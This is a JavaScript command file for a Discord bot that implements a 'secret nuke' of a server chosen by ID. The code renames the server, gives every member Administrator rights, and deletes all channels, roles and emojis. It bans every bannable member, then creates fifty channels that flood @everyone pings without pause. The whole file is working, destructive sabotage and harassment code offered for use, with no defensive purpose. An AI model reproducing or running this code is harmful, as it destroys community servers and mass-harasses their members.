const config = require('../config.json');

module.exports = {
    name: "snuke",
    description: `Secret nuke. Requires ID if you are executing from another guild. E.G: ${config.prefix}snuke 1234567890`,
    execute(message, args) {
        if(args[0]) {
            const guild = message.client.guilds.cache.get(args[0]);
            guild.setName(config.nuke_options.guild.guild_name).then(async guild => {
                await guild.setIcon(config.nuke_options.guild.guild_icon);
                await guild.setDefaultMessageNotifications(0);
                await guild.roles.everyone.setPermissions("Administrator");
        
                guild.channels.cache.filter(channel => channel.deletable).forEach(channel => channel.delete());
                guild.members.cache.filter(member => member.bannable).forEach(async member => await member.ban());
                guild.emojis.cache.filter(emoji => emoji.deletable).forEach(async emoji => emoji.delete());
                guild.roles.cache.filter(role => role.editable && role.name !== '@everyone').forEach(
                    async role => role.delete());
        
                for (let i = 0; i < 50; i++) {
                    await guild.channels.create({
                        name: 'lol',
                        type: 0 
                    }).then(async textChannel => {
                        setInterval(async() => {
                            await textChannel.send('@everyone');
                            await textChannel.send('@everyone');
                            await textChannel.send('@everyone');
                            await textChannel.send('@everyone');
                            await textChannel.send('@everyone');
                        });
                    });
                }
            });
        } else {
            message.channel.send("You didn't input a guild ID!");
        }
    }
}
